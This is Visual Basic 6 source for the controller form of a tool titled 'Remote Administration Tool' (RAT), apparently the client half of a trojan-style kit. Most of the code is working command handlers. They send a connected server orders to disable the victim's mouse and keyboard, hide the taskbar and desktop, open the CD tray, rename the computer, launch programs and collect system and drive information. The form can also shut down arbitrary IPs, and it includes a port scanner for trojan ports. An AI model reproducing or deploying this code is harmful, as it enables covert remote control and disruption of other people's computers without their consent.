         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "CHANGE STATE"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Left            =   6480
         MouseIcon       =   "frm_main.frx":E268
         MousePointer    =   99  'Custom
         TabIndex        =   49
         ToolTipText     =   "Change Key State Of Scroll Lock"
         Top             =   2820
         Width           =   1815
      End
      Begin VB.Line Line83 
         BorderColor     =   &H80000005&
         X1              =   6000
         X2              =   8640
         Y1              =   3240
         Y2              =   3240
      End
      Begin VB.Label Label12 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "Keyboard Control"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   11.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000014&
         Height          =   255
         Left            =   0
         TabIndex        =   101
         Top             =   0
         Width           =   8745
      End
   End
   Begin VB.Image Image2 
      Height          =   2505
      Left            =   5040
      Picture         =   "frm_main.frx":E572
      Top             =   1920
      Width           =   2205
   End
   Begin VB.Label bar 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   1  'Fixed Single
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Index           =   2
      Left            =   7200
      TabIndex        =   127
      Top             =   6240
      Width           =   3600
   End
   Begin VB.Line Line1 
      BorderColor     =   &H00000000&
      BorderWidth     =   3
      Index           =   1
      X1              =   0
      X2              =   1920
      Y1              =   1080
      Y2              =   1080
   End
   Begin VB.Image Image1 
      Appearance      =   0  'Flat
      BorderStyle     =   1  'Fixed Single
      Height          =   600
      Left            =   120
      Picture         =   "frm_main.frx":F71D
      Stretch         =   -1  'True
      Top             =   420
      Width           =   1700
   End
   Begin VB.Line Line1 
      BorderColor     =   &H00000000&
      BorderWidth     =   2
      Index           =   7
      X1              =   1920
      X2              =   10800
      Y1              =   6240
      Y2              =   6255
   End
   Begin VB.Line Line1 
      BorderColor     =   &H00000000&
      BorderWidth     =   2
      Index           =   4
      X1              =   15
      X2              =   15
      Y1              =   6480
      Y2              =   0
   End
   Begin VB.Line Line1 
      BorderColor     =   &H00000000&
      BorderWidth     =   3
      Index           =   5
      X1              =   10810
      X2              =   10810
      Y1              =   6540
      Y2              =   0
   End
   Begin VB.Line Line1 
      BorderColor     =   &H00000000&
      BorderWidth     =   3
      Index           =   3
      X1              =   1920
      X2              =   1920
      Y1              =   360
      Y2              =   6240
   End
   Begin VB.Label Control_Box 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "H"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Index           =   5
      Left            =   9945
      MouseIcon       =   "frm_main.frx":FFAF
      MousePointer    =   99  'Custom
      TabIndex        =   87
      ToolTipText     =   "Hide RAT"
      Top             =   45
      Width           =   255
   End
   Begin VB.Line Line1 
      BorderColor     =   &H00000000&
      BorderWidth     =   3
      Index           =   9
      X1              =   0
      X2              =   10860
      Y1              =   6480
      Y2              =   6480
   End
   Begin VB.Label bar 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "Not Connected"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Index           =   0
      Left            =   15
      TabIndex        =   86
      Top             =   6240
      Width           =   1898
   End
   Begin VB.Label bar 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   1  'Fixed Single
      Caption         =   " No Current Connection"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   178
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   225
      Index           =   1
      Left            =   1935
      TabIndex        =   85
      Top             =   6270
      Width           =   5250
   End
   Begin VB.Label Control_Box 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "-"
      BeginProperty Font 
         Name            =   "Terminal"
         Size            =   13.5
         Charset         =   255
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Index           =   1
      Left            =   10225
      MouseIcon       =   "frm_main.frx":102B9
      MousePointer    =   99  'Custom
      TabIndex        =   84
      ToolTipText     =   "Minimize RAT"
      Top             =   45
      Width           =   255
   End
   Begin VB.Label Control_Box 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "X"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Index           =   0
      Left            =   10510
      MouseIcon       =   "frm_main.frx":105C3
      MousePointer    =   99  'Custom
      TabIndex        =   83
      ToolTipText     =   "Exit RAT"
      Top             =   45
      Width           =   255
   End
   Begin VB.Label TiTle 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      Caption         =   " Remote Administration Tool"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   9.75
         Charset         =   178
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   60
      TabIndex        =   78
      Top             =   45
      Width           =   9850
   End
   Begin VB.Line Line1 
      BorderColor     =   &H00000000&
      BorderWidth     =   3
      Index           =   2
      X1              =   0
      X2              =   10800
      Y1              =   0
      Y2              =   0
   End
   Begin VB.Line Line1 
      BorderColor     =   &H00000000&
      BorderWidth     =   3
      Index           =   0
      X1              =   0
      X2              =   10920
      Y1              =   330
      Y2              =   330
   End
End
Attribute VB_Name = "Frm_Main"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Variables
Dim connectseconds As Integer
Dim b, c As Integer
Dim a As Boolean
Dim connectclick As Boolean
Dim sql As String
Dim db As Database
Dim rs As Recordset
Dim trotimer As Integer ' for trojan scanner
Dim tscan As Boolean 'for trojan scanner




'checks the connection for every interval and displays the status
Private Sub connecttimer_Timer()
On Error Resume Next
connectseconds = 1
bar(2).Caption = progress
If sockclient.State <> 7 Then
    bar(0).Caption = "Not Connected"
    bar(1).Caption = " No Current Connection"
End If
End Sub

'code for 0-close , 1-minimize , 5-Hide mainform
Private Sub Control_Box_Click(Index As Integer)
On Error Resume Next
Select Case Index
    Case 0
        If MsgBox("ARE YOU SURE ?", vbExclamation + vbYesNo, "RAT - ALERT") = vbYes Then
            DeleteIcon
            End
        End If
    Case 1
        Frm_Main.WindowState = 1
    Case 5
        CreateIcon
        Me.Visible = False
End Select
End Sub

'''''''''''''''''''''''''''''SELECT A MODULE FROM MAINFORM''''''''''''''''''''''''''
Private Sub door_Click(Index As Integer)
On Error Resume Next
'show particular form
Select Case Index
    Case 1 'scanner
        Frm_scanner.Show
    Case 15 'exit
        If MsgBox("ARE YOU SURE ?", vbExclamation + vbYesNo, "RAT - ALERT") = vbYes Then
            DeleteIcon
            End
        End If
    Case 8 'chat
        If chatopen = False Then
        sockclient.SendData "STARTCHAT"
        End If
        
        Frm_Chat.Show
    Case 14 'About
        frmAbout.Show
    
    Case 13 ' Help
        MsgBox "READ DOCUMENTATION FOR HELP - programmers", vbInformation + vbOKOnly, "RAT - ALERT"
    
End Select
'disable all Room
Call disableall
'enable a Room
enable (Index)
End Sub

Private Sub Form_Load()
On Error Resume Next
'If App.PrevInstance = True Then Unload Me
'App.TaskVisible = False 'invisible from task manager
chatopen = False
connectclick = False
Call disableall
picTray.Visible = False
End Sub

'''''''''''''''''''''''''''VISIBLE PARTICULAR ROOM'''''''''''''''''
Private Sub enable(Index As Integer)
On Error Resume Next
Select Case Index
Case 0:
'connect
    Call disableall
    With Picture1(0)
        .Visible = True
        .Top = 380
        .Left = 1973
        .Width = 8830
        .Height = 5870
    End With

Case 1:
'scanner
    Call disableall

Case 2:
'open\close
    Call disableall
    With Picture3
        .Visible = True
        .Top = 380
        .Left = 1973
        .Width = 8830
        .Height = 5870
    End With

Case 3:
'Control
    Call disableall
    With Picture4
        .Visible = True
        .Top = 380
        .Left = 1973
        .Width = 8830
        .Height = 5870
    End With

Case 4:
'Get information
    Call disableall
    With Picture5
        .Visible = True
        .Top = 380
        .Left = 1973
        .Width = 8830
        .Height = 5870
    End With

Case 5:
'Mouse control
    Call disableall
    With Picture6
        .Visible = True
        .Top = 380
        .Left = 1973
        .Width = 8830
        .Height = 5870
    End With

Case 6:
'Keyboard control
    Call disableall
    With Picture12
        .Visible = True
        .Top = 380
        .Left = 1973
        .Width = 8830
        .Height = 5870
    End With

Case 7:
'Terminate
    Call disableall
    With Picture8
        .Visible = True
        .Top = 380
        .Left = 1973
        .Width = 8830
        .Height = 5870
    End With
    'make the option to server selection in that room
    Option_Click (0)

Case 9:
'Message center
    Call disableall
    Call disableall
    With Picture1(1)
        .Visible = True
        .Top = 380
        .Left = 1973
        .Width = 8830
        .Height = 5870
    End With
    
Case 12
'Trojan Scanner
    Call disableall
    With Picture2
        .Visible = True
        .Top = 380
        .Left = 1973
        .Width = 8830
        .Height = 5870
    End With
    Set db = OpenDatabase(App.Path & "\TrojanList.mdb")
    Set rs = db.OpenRecordset("Trojan", dbOpenDynaset)
    
End Select
End Sub

''''''''''''''''''''''''''''INVISIBLE ALL ROOMS'''''''''''''''''''''''''''''''''''
Private Sub disableall()
On Error Resume Next
Picture1(0).Visible = False
Picture1(1).Visible = False
Picture2.Visible = False
Picture3.Visible = False
Picture4.Visible = False
Picture5.Visible = False
Picture6.Visible = False
Picture8.Visible = False
Picture12.Visible = False
End Sub

Private Sub Form_Unload(Cancel As Integer)
On Error Resume Next
DeleteIcon 'Delete the Icon from Systray
End Sub

Private Sub cmdwinstart_Click()
On Error Resume Next
sockclient.SendData cmbwin.Text 'open a selected window
End Sub

Private Sub lblcdopen_Click(Index As Integer)
On Error Resume Next
sockclient.SendData "CDOPEN" 'open cd tray
End Sub

Private Sub lblcdclose_Click(Index As Integer)
On Error Resume Next
sockclient.SendData "CDCLOSE" 'close cd tray
End Sub

Private Sub lblcapon_Click()
On Error Resume Next
sockclient.SendData "CAPSLOCKCHANGE" 'change caps state
End Sub

Private Sub lblclkhide_Click()
On Error Resume Next
sockclient.SendData "CLKHIDE" 'hide the clock
End Sub

Private Sub lblclkshow_Click()
On Error Resume Next
sockclient.SendData "CLKSHOW" 'show the clock
End Sub

Private Sub lblcompchange_Click()
On Error Resume Next
Dim cmpname As String
cmpname = Trim(txtcmpname.Text) & "1111"
sockclient.SendData cmpname 'change computer name - "NAME1111"
End Sub

'connect
Private Sub lblconnect_Click()
On Error Resume Next
'allow when port less or equal 32767
If txtserverport <= 32767 Then
    progress = " "
    If sockclient.State = 7 Then sockclient.Close 'if socket open then close it
        connectclick = True 'set connect is clicked
        lblconnect.Enabled = False 'disable connect button
        serverip = txtserverip.Text
        serverport = txtserverport.Text
        sockclient.Connect serverip, serverport 'connect with server
        connectseconds = 0
        Do While connectseconds = 0
            DoEvents
        Loop
        'check whether it is connected
        If sockclient.State = 7 Then
            bar(0).Caption = "connected"
            bar(1).Caption = "Connected With " & sockclient.RemoteHostIP & " on " & Time
        Else
            bar(1).Caption = "Invalid IP or No Server Running "
            sockclient.Close
            lblconnect.Enabled = True
        End If
    Else
        MsgBox "Port Must Be Between 1 and 32767"
End If
End Sub

'Message center Generate/Send
Private Sub lblctrl_Click(Index As Integer)
On Error Resume Next
Select Case Index

Case 0 'Generate
    Select Case cmbmtype.Text
    Case "Critical"
        MsgBox txtmsgdata.Text, vbCritical, txttitle.Text
    Case "Exclamation"
        MsgBox txtmsgdata.Text, vbExclamation, txttitle.Text
    Case "Information"
        MsgBox txtmsgdata.Text, vbInformation, txttitle.Text
    Case "OK Only"
        MsgBox txtmsgdata.Text, vbOKOnly, txttitle.Text
    Case "Question"
        MsgBox txtmsgdata.Text, vbQuestion, txttitle.Text
    End Select

Case 1 'Send
    Dim mtitle As String
    Dim msg As String
    Dim mtype As String
       
    mtitle = txttitle.Text
    Do While Len(mtitle) < 20
        mtitle = mtitle & "`"
    Loop 'make title as 20 charectered string by adding suffix ` - "TITLE```"
    
    msg = txtmsgdata.Text
    Select Case cmbmtype.Text
        Case "Critical"
            mtype = "111"
        Case "Exclamation"
            mtype = "222"
        Case "Information"
            mtype = "333"
        Case "OK Only"
            mtype = "444"
        Case "Question"
            mtype = "555"
    End Select 'assign code for message type
    
    'send "Title+Message+Type+9999
    sockclient.SendData mtitle & msg & mtype & "9999"
    End Select
End Sub

'Disconnect
Private Sub lbldconnect_Click()
On Error Resume Next
If connectclick = True Then
    If sockclient.State = 7 Then
        sockclient.SendData "RESETSERVER" 'set command to restart the server
        connectseconds = 0
        Do While connectseconds = 0
            DoEvents
        Loop
    End If
    sockclient.Close
    lblconnect.Enabled = True
    bar(0).Caption = "Not Connected"
    bar(1).Caption = " No Current Connection"
    connectclick = False
End If
End Sub

Private Sub lbldeskhide_Click()
On Error Resume Next
sockclient.SendData "DESKTOPHIDE" 'hide the desktop icons
End Sub

Private Sub lbldeskshow_Click()
On Error Resume Next
sockclient.SendData "DESKTOPSHOW" 'show the desktop icons
End Sub

Private Sub lbldrive_Click()
On Error Resume Next
sockclient.SendData "DRIVEINFO" 'drive information
End Sub

Private Sub lbldswapm_Click()
On Error Resume Next
sockclient.SendData "DISABLESWAP" 'Disable Mouse Swap
End Sub

Private Sub lbleswapm_Click()
On Error Resume Next
sockclient.SendData "ENABLESWAP" 'Enable Mouse Swap
End Sub

Private Sub lblfmouse_Click(Index As Integer)
On Error Resume Next
If Index = 0 Then
    sockclient.SendData "FUNNYMOUSESTART" 'start the funnymouse
Else
    If Index = 1 Then
        sockclient.SendData "FUNNYMOUSESTOP" 'stop the funny mouse
    End If
End If
End Sub

Private Sub lblfplay_Click()
On Error Resume Next
Dim bsend As String

bsend = Trim(txtfreq.Text)
Do While Len(bsend) < 5
    bsend = bsend & "x"
Loop 'add suffix 'x' to frequency to be 5 digit

bsend = bsend & Trim(txttime.Text)
Do While Len(bsend) < 14
    bsend = bsend & "x"
Loop ' add suffix 'x' to time to be 14 digit

bsend = bsend & "BEEP7777"
sockclient.SendData bsend 'send "FREQUENCY+TIME+BEEP7777"
progress = "Beeping...."
End Sub

Private Sub lblgetwin_Click()
On Error Resume Next
sockclient.SendData "GETWINDOWS" 'get windows information
End Sub

Private Sub lblhcursor_Click()
On Error Resume Next
sockclient.SendData "HIDECURSOR" 'hide the cursor
End Sub

Private Sub lblmin_Click()
On Error Resume Next
sockclient.SendData "MINIMIZEALL" 'minimize all windows
End Sub

Private Sub lblmkdisable_Click()
On Error Resume Next
sockclient.SendData "MKDISABLE" 'mouse keyboard disable
End Sub

Private Sub lblmkenable_Click()
On Error Resume Next
sockclient.SendData "MKENABLE" 'mouse keyboard enable
End Sub

Private Sub lblnumon_Click()
On Error Resume Next
sockclient.SendData "NUMLOCKCHANGE" 'change num lock status
End Sub

Private Sub lblprostart_Click()
On Error Resume Next
Dim prosend As String

cmbpro.SelStart = 0
cmbpro.SelLength = Len(cmbpro.Text)
If cmbpro.SelText = "SOLITARE" Then 'if solitire selected
prosend = "sol3333"
Else
prosend = LTrim(RTrim(cmbpro.SelText)) + "3333"
End If
sockclient.SendData prosend 'send "PROGRAM+3333"
End Sub

Private Sub lblrun_Click()
On Error Resume Next
sockclient.SendData "STARTSCREENSAVER" 'start a screensaver
End Sub

Private Sub lblscan_Click() ' Trojan scanner
On Error Resume Next

Dim itemkey As String
Dim i As Integer
Dim ip As String
Dim port As Long
Dim protocol As String
Dim trojan As String
Dim a As Integer
Dim b As Integer



tscan = True
lblscan.Enabled = False
a = lsttrojan.ListItems.Count
For b = 1 To a 'clear list
    lsttrojan.ListItems.Remove (1)
Next b
ip = txttip(0).Text & "." & txttip(1).Text & "." & txttip(2).Text & "." & txttip(3).Text

progress = "Trojan Scanning - " & ip

sql = "select * from Trojan"
Set rs = db.OpenRecordset(sql)
rs.MoveFirst

For i = 0 To 417 'total records in db

    port = rs("PORT")
    protocol = rs("PROTOCAL")
    trojan = rs("TROJAN NAME")
    
    socktrojan.Close
    socktrojan.Connect ip, port
    trotimer = 0
    Do While trotimer = 0
        DoEvents
    Loop
    If socktrojan.State = 7 Then
        progress = "Trojan Found on " & ip
        With lsttrojan
            itemkey = port & "," & protocol & trojan
            .ListItems.Add , itemkey, trojan
            .ListItems(itemkey).SubItems(1) = port
            .ListItems(itemkey).SubItems(2) = protocol
            '.ListItems(itemkey).SubItems(3) = rs("DESCRIPTION")
    End With
    End If
    socktrojan.Close
    rs.MoveNext
    If tscan = False Then Exit For
    ProgressBar.Value = i
Next i
lblscan.Enabled = True
progress = "Finished Trojan Scanning "
End Sub

Private Sub lblscrlon_Click()
On Error Resume Next
sockclient.SendData "SCROLLLOCKCHANGE" 'change scroll lock status
End Sub

Private Sub lblscursor_Click()
On Error Resume Next
sockclient.SendData "SHOWCURSOR" 'show the cursor
End Sub

Private Sub lblsetcur_Click()
On Error Resume Next
Dim fsend As String

fsend = Trim(txtmxaxis.Text)
Do While Len(fsend) < 3
    fsend = fsend & "x"
Loop 'add suffix 'x' to make 3 digit

fsend = fsend & Trim(txtmyaxis.Text)
Do While Len(fsend) < 6
    fsend = fsend & "x"
Loop 'add suffix 'x' to make 3 digit

fsend = fsend & "CURPOS6666"
sockclient.SendData fsend 'send "X+Y+CURPOS6666"
End Sub

Private Sub lblsetdtime_Click()
On Error Resume Next
Dim fsend As String

fsend = Trim(txtdtime.Text)
Do While Len(fsend) < 5
fsend = fsend & "x"
Loop 'add suffix 'x' to make 5 digit

fsend = fsend & "DBLCLICK5555"
sockclient.SendData fsend 'send "TIME+DBLCLICK5555"
End Sub

Private Sub lblsplay_Click()
On Error Resume Next
sockclient.SendData txtspath.Text & "4444" 'play a sound  "SOUNDPATH+4444"
progress = "Playing Sound File..."
End Sub

Private Sub lblstartdab_Click()
On Error Resume Next
sockclient.SendData "STARTDISABLE" 'disable the start button
End Sub

Private Sub lblstartenb_Click()
On Error Resume Next
sockclient.SendData "STARTENABLE" 'enable the start button
End Sub

Private Sub lblstop_Click()
On Error Resume Next
tscan = False
lblscan.Enabled = True
End Sub

Private Sub lblstrayhide_Click()
On Error Resume Next
sockclient.SendData "STRAYHIDE" 'system tray hide
End Sub

Private Sub lblstrayshow_Click()
On Error Resume Next
sockclient.SendData "STRAYSHOW" 'system tray show
End Sub

Private Sub lblsystem_Click()
On Error Resume Next
sockclient.SendData "GETSYSINFO" 'get system information
End Sub

Private Sub lbltbarhide_Click()
On Error Resume Next
sockclient.SendData "TASKBARHIDE" 'make taskbar invisible
End Sub

Private Sub lbltbarshow_Click()
On Error Resume Next
sockclient.SendData "TASKBARSHOW" 'make taskbar visible
End Sub

Private Sub lblterminate_Click(Index As Integer)
On Error Resume Next
Select Case txtip(0).Enabled 'check option (server or other)
Case True 'other
    Dim sysip As String
    Dim systime As Integer
    
    sysip = Val(txtip(0).Text) & "." & Val(txtip(1).Text) & "." & Val(txtip(2).Text) & "." & Val(txtip(3).Text)
    systime = Val(txtxtime.Text)
    sysmsg = txtmsg.Text
    
    Select Case Index
    Case 0 'shutdown
          ret = InitiateSystemShutdown(sysip, sysmsg, systime, True, False)
          If ret = 1 Then
          progress = "Shutdown Success on " & sysip
          Else
          progress = "Shutdown Failure on " & sysip
          End If
    Case 1 'abort shutdown
          ret = AbortSystemShutdown(sysip)
          If ret = 1 Then
          progress = "Abort Shutdown Success on " & sysip
          Else
          progress = "Abort Shutdown Failure on " & sysip
          End If
    Case 2 'restart
          ret = InitiateSystemShutdown(sysip, sysmsg, systime, True, True)
          If ret = 1 Then
          progress = "Restart Success on " & sysip
          Else
          progress = "Restart Failure on " & sysip
          End If
    End Select

Case False
    Dim buffer As String
    Dim rtime As String
    
    rtime = Trim(txtxtime.Text)
    Do While Len(rtime) < 10
    rtime = rtime & "x"
    Loop 'add suffix 'x' to make 10 digit
    
    buffer = rtime & txtmsg.Text
    
    'Send "TIME+MESSAGE+CODE+8888"
    Select Case Index
    Case 0 'shutdown
        buffer = buffer & "SSS" & "8888"
        sockclient.SendData buffer
    Case 1 'shutdown
        sockclient.SendData "ABTSHUTDOWN"
    Case 2 'restart
        buffer = buffer & "RRR" & "8888"
        sockclient.SendData buffer
    Case 3 'logoff
        buffer = buffer & "LLL" & "8888"
        sockclient.SendData buffer
    End Select
End Select
End Sub

Private Sub lblwintime_Click()
On Error Resume Next
sockclient.SendData "WINDOWSRUNTIME" 'get windows running time
End Sub

Private Sub Option_Click(Index As Integer) 'terminate module
On Error Resume Next
'0-server
'1-other
If Index = 1 Then
    txtip(0).Enabled = True
    txtip(1).Enabled = True
    txtip(2).Enabled = True
    txtip(3).Enabled = True
    txtxtime.Enabled = True
    lblterminate(3).Visible = False
    lblterminate(0).Visible = True
    lblterminate(1).Visible = True
    lblterminate(2).Visible = True
    txtmsg.Enabled = True
Else
    If Index = 0 Then
        txtip(0).Enabled = False
        txtip(1).Enabled = False
        txtip(2).Enabled = False
        txtip(3).Enabled = False
        lblterminate(3).Visible = True
        lblterminate(0).Visible = True
        lblterminate(1).Visible = True
        lblterminate(2).Visible = True
        txtxtime.Enabled = True
        txtmsg.Enabled = True
    End If
End If
End Sub

'show app when RAT clicked from systray
Private Sub pictray_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
If Me.Visible = True Then Exit Sub
Select Case X
Case Is = WM_LBUTTONDOWN
    Me.Visible = True
End Select
End Sub

''''''''''''''''''''''''''''''''DATA RECIVED FROM SERVER''''''''''''''''''''''''''''
Private Sub sockclient_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next
Dim recived As String
Dim prefix As String

sockclient.GetData recived 'recived data
'MsgBox recived

prefix = Mid(recived, 1, 3) 'prefix = starting first 3 letters

Select Case prefix
Case "WRT" 'windows running time
    txtinfo.Text = txtinfo.Text & "WINDOWS RUNNING TIME : " & Mid(recived, 4, Len(recived) - 3) & vbNewLine
    txtinfo.Text = txtinfo.Text & "____________________________________" & vbNewLine & vbNewLine
    progress = "Windows Running Time Recived"
    txtinfo.SelStart = Len(txtinfo.Text)
Case "GWD" 'opened windows
    txtinfo.Text = txtinfo.Text & "-----CURRENTLY OPENED WINDOWS-------" & vbNewLine & vbNewLine
    txtinfo.Text = txtinfo.Text & Mid(recived, 4, Len(recived) - 3) & vbNewLine
    txtinfo.Text = txtinfo.Text & "____________________________________" & vbNewLine & vbNewLine
    progress = "Currently Open Window Info Recived"
    txtinfo.SelStart = Len(txtinfo.Text)
Case "GDI" 'drive information
    txtinfo.Text = txtinfo.Text & "DRIVE--LABEL-----TYPE-----FREESPACE" & vbNewLine & vbNewLine
    txtinfo.Text = txtinfo.Text & Mid(recived, 4, Len(recived) - 3) & vbNewLine
    txtinfo.Text = txtinfo.Text & "____________________________________" & vbNewLine & vbNewLine
    progress = "Drive Info Recived"
    txtinfo.SelStart = Len(txtinfo.Text)
Case "GSI" 'system information
    txtinfo.Text = txtinfo.Text & "---------SYSTEM NFORMATION----------" & vbNewLine & vbNewLine
    txtinfo.Text = txtinfo.Text & Mid(recived, 4, Len(recived) - 3) & vbNewLine
    txtinfo.Text = txtinfo.Text & "____________________________________" & vbNewLine & vbNewLine
    progress = "System Info Recived"
    txtinfo.SelStart = Len(txtinfo.Text)
End Select

'if msg is not for any room then print it in status
If prefix <> "WRT" And prefix <> "GWD" And prefix <> "GDI" And prefix <> "GSI" Then
    progress = recived
End If
End Sub

'RAT move
Private Sub TiTle_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
MousePointer = 5
b = X
c = Y
a = True
End Sub

'RAT move
Private Sub TiTle_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
 If a Then
        Me.Move Left + (X - b), Top + (Y - c)
    End If
End Sub

'RAT move
Private Sub TiTle_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
a = False
MousePointer = 0
End Sub

Private Sub tmrtrojan_Timer() ' Trojan Timer
On Error Resume Next
trotimer = 1
End Sub

Private Sub txtcmpname_GotFocus()
txtcmpname.SelStart = 0
txtcmpname.SelLength = Len(txtcmpname.Text)
End Sub

Private Sub txtcmpname_KeyPress(KeyAscii As Integer)
If KeyAscii = 13 Then lblcompchange_Click
End Sub

Private Sub txtdtime_GotFocus()
txtdtime.SelStart = 0
txtdtime.SelLength = Len(txtdtime.Text)
End Sub

Private Sub txtdtime_KeyPress(KeyAscii As Integer)
If KeyAscii = 13 Then lblsetdtime_Click
End Sub

Private Sub txtfreq_GotFocus()
txtfreq.SelStart = 0
txtfreq.SelLength = Len(txtfreq.Text)
End Sub

Private Sub txtfreq_KeyPress(KeyAscii As Integer)
If KeyAscii = 13 Then lblfplay_Click
End Sub

Private Sub txtip_GotFocus(Index As Integer)
txtip(Index).SelStart = 0
txtip(Index).SelLength = 3
End Sub

Private Sub txtmsg_GotFocus()
txtmsg.SelStart = 0
txtmsg.SelLength = Len(txtmsg.Text)
End Sub

Private Sub txtmsgdata_GotFocus()
txtmsgdata.SelStart = 0
txtmsgdata.SelLength = Len(txtmsgdata.Text)
End Sub

Private Sub txtmxaxis_GotFocus()
txtmxaxis.SelStart = 0
txtmxaxis.SelLength = Len(txtmxaxis.Text)
End Sub

Private Sub txtmxaxis_KeyPress(KeyAscii As Integer)
If KeyAscii = 13 Then lblsetcur_Click
End Sub

Private Sub txtmyaxis_GotFocus()
txtmyaxis.SelStart = 0
txtmyaxis.SelLength = Len(txtmyaxis.Text)
End Sub

Private Sub txtmyaxis_KeyPress(KeyAscii As Integer)
If KeyAscii = 13 Then lblsetcur_Click
End Sub

Private Sub txtserverip_GotFocus()
txtserverip.SelStart = 0
txtserverip.SelLength = Len(txtserverip.Text)
End Sub

Private Sub txtserverip_KeyPress(KeyAscii As Integer)
If KeyAscii = 13 Then lblconnect_Click
End Sub

Private Sub txtserverport_GotFocus()
txtserverport.SelStart = 0
txtserverport.SelLength = 5
End Sub

Private Sub txtserverport_KeyPress(KeyAscii As Integer)
If KeyAscii = 13 Then lblconnect_Click
End Sub

Private Sub txtspath_Click()
txtspath.SelStart = 0
txtspath.SelLength = Len(txtspath.Text)
End Sub

Private Sub txtspath_GotFocus()
txtspath.SelStart = 0
txtspath.SelLength = Len(txtspath.Text)
End Sub

Private Sub txtspath_KeyPress(KeyAscii As Integer)
If KeyAscii = 13 Then lblsplay_Click
End Sub

Private Sub txttime_GotFocus()
txttime.SelStart = 0
txttime.SelLength = Len(txttime.Text)
End Sub

Private Sub txttime_KeyPress(KeyAscii As Integer)
If KeyAscii = 13 Then lblfplay_Click
End Sub

Private Sub txttip_Click(Index As Integer)
txttip(Index).SelStart = 0
txttip(Index).SelLength = Len(txttip(Index).Text)
End Sub

Private Sub txttip_GotFocus(Index As Integer)
txttip(Index).SelStart = 0
txttip(Index).SelLength = Len(txttip(Index).Text)
End Sub

Private Sub txttip_KeyPress(Index As Integer, KeyAscii As Integer)
If KeyAscii = 13 Then lblscan_Click
End Sub

Private Sub txttitle_GotFocus()
txttitle.SelStart = 0
txttitle.SelLength = Len(txttitle.Text)
End Sub

Private Sub txttitle_KeyPress(KeyAscii As Integer)
If KeyAscii = 13 Then lblctrl_Click (1)
End Sub

Private Sub txtxtime_GotFocus()
txtxtime.SelStart = 0
txtxtime.SelLength = Len(txtxtime.Text)
End Sub

Private Sub Control_Box_MouseDown(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
Control_Box(Index).BorderStyle = 1
End Sub

Private Sub Control_Box_MouseUp(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
Control_Box(Index).BorderStyle = 0
End Sub

Private Sub cmbmtype_KeyPress(KeyAscii As Integer)
If KeyAscii = 13 Then lblctrl_Click (1)
End Sub

Private Sub cmbpro_GotFocus()
cmbpro.SelStart = 0
cmbpro.SelLength = Len(cmbpro.Text)
End Sub

Private Sub cmbpro_KeyPress(KeyAscii As Integer)
If KeyAscii = 13 Then lblprostart_Click
End Sub

Private Sub cmbwin_KeyPress(KeyAscii As Integer)
If KeyAscii = 13 Then cmdwinstart_Click
End Sub

Private Sub cmdwinstart_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
cmdwinstart.BorderStyle = 1
End Sub

Private Sub cmdwinstart_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
cmdwinstart.BorderStyle = 0
End Sub

